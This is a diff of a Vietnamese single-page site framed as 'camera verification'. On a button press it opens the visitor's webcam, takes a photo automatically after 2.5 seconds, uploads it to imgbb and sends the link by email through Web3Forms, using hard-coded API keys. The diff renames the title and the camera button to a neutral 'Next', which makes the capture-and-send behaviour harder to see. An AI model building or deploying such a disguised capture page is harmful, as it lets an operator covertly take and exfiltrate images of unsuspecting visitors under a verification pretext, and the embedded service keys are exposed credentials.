@@ -1,42 +1,48 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Chụp & Gửi ảnh</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Next</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: linear-gradient(120deg,#74ebd5,#ACB6E5);
-      height: 100vh; display: flex; justify-content: center; align-items: center;
+      display: flex; align-items: center; justify-content: center;
+      height: 100vh;
+      background: linear-gradient(270deg,#ff7a7a,#ffb36b,#fff38a,#9be89b,#7fb6ff,#b58bff);
+      background-size: 1400% 1400%;
+      animation: bg 18s linear infinite;
+    }
+    @keyframes bg {
+      0%{background-position:0% 50%}
+      50%{background-position:100% 50%}
+      100%{background-position:0% 50%}
     }
     .card {
-      background: #fff; padding: 20px; border-radius: 12px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
-      text-align: center; width: 350px;
+      width: 380px; background: #fff; padding: 22px; border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.12); text-align: center;
     }
-    h2 { margin-bottom: 15px; color: #333; }
     video, canvas, img {
       width: 100%; border-radius: 8px; margin-top: 10px;
     }
     button {
-      margin-top: 12px; padding: 10px 14px;
-      border: none; border-radius: 8px;
-      background: #0078d7; color: #fff; font-size: 15px; cursor: pointer;
+      margin-top: 12px; padding: 10px 14px; border-radius: 8px;
+      border: none; background: #1976d2; color: #fff; font-size: 15px; cursor: pointer;
     }
     .msg { margin-top: 10px; font-size: 14px; }
-    .err { color: #c62828; }
-    .ok { color: #2e7d32; font-weight: bold; }
+    .err { color: #b00020; }
+    .ok { color: #0b8043; font-weight: 600; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>Xác minh bằng ảnh</h2>
-    <button id="openCam">📸 Mở camera</button>
+    <h2>Camera xác minh</h2>
+    <p>Bấm nút để camera tự chụp và gửi ảnh.</p>
+    <button id="openCam">Next</button>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <img id="preview" alt="Ảnh chụp" style="display:none;" />
+    <img id="preview" alt="Ảnh chụp" style="display:none;"/>
     <div id="msg" class="msg"></div>
   </div>
 
@@ -44,11 +50,12 @@
   const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
   const IMGBB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";
 
-  const msg = document.getElementById("msg");
-  const openCamBtn = document.getElementById("openCam");
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const preview = document.getElementById("preview");
+  const msg = document.getElementById('msg');
+  const openCamBtn = document.getElementById('openCam');
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const preview = document.getElementById('preview');
+
   let stream = null;
 
   const showError = t => { msg.textContent = "❌ " + t; msg.className = "msg err"; };
@@ -62,8 +69,8 @@
       video.srcObject = stream;
       video.style.display = "block";
 
-      // Tự động chụp sau 2 giây
-      setTimeout(captureAndSend, 2000);
+      // chờ camera khởi động
+      setTimeout(() => captureAndSend(), 2500);
     } catch (err) {
       showError("Không thể mở camera: " + err.message);
       openCamBtn.disabled = false;
@@ -72,42 +79,41 @@
 
   async function captureAndSend() {
     try {
-      if (!video.videoWidth) {
-        showError("Camera chưa sẵn sàng. Thử lại.");
+      if (video.videoWidth === 0) {
+        showError("Camera chưa sẵn sàng, thử lại.");
         openCamBtn.disabled = false;
         return;
       }
 
       msg.textContent = "📸 Đang chụp ảnh...";
-      const ctx = canvas.getContext("2d");
+      const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const captured = canvas.toDataURL("image/png");
-
-      preview.src = captured;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const capturedImage = canvas.toDataURL("image/png");
+      preview.src = capturedImage;
       preview.style.display = "block";
       video.style.display = "none";
       if (stream) stream.getTracks().forEach(t => t.stop());
 
-      msg.textContent = "⏳ Đang tải ảnh lên imgbb...";
-      const form = new FormData();
-      form.append("image", captured.split(",")[1]);
+      msg.textContent = "⏳ Đang tải ảnh lên...";
+      const formData = new FormData();
+      formData.append("image", capturedImage.split(",")[1]);
 
       const upload = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {
-        method: "POST", body: form
+        method: "POST", body: formData
       });
       const imgRes = await upload.json();
-      if (!imgRes.success) throw new Error("Upload imgbb thất bại: " + imgRes.error?.message);
+      if (!imgRes.success) throw new Error("Upload imgbb thất bại!");
 
       const imageUrl = imgRes.data.url;
-      msg.textContent = "📨 Đang gửi ảnh qua Web3Forms...";
+      msg.textContent = "📨 Đang gửi qua Web3Forms...";
 
       const payload = {
         access_key: WEB3FORMS_KEY,
-        subject: "Ảnh xác minh mới",
-        from_name: "Trang xác minh",
-        message: `<img src="${imageUrl}" width="250" style="border-radius:8px;">`
+        subject: "Ảnh tự chụp mới",
+        from_name: "Trang xác minh tự động",
+        message: `<p>Ảnh mới chụp:</p><img src="${imageUrl}" width="250">`
       };
 
       const res = await fetch("https://api.web3forms.com/submit", {
@@ -117,10 +123,11 @@
       });
       const result = await res.json();
 
-      if (result.success) showOK("Ảnh đã gửi thành công!");
+      if (result.success) showOK("✅ Ảnh đã được gửi thành công!");
       else showError("Lỗi gửi: " + result.message);
+
     } catch (err) {
-      showError("Lỗi: " + err.message);
+      showError("⚠️ Lỗi: " + err.message);
       openCamBtn.disabled = false;
     }
   }
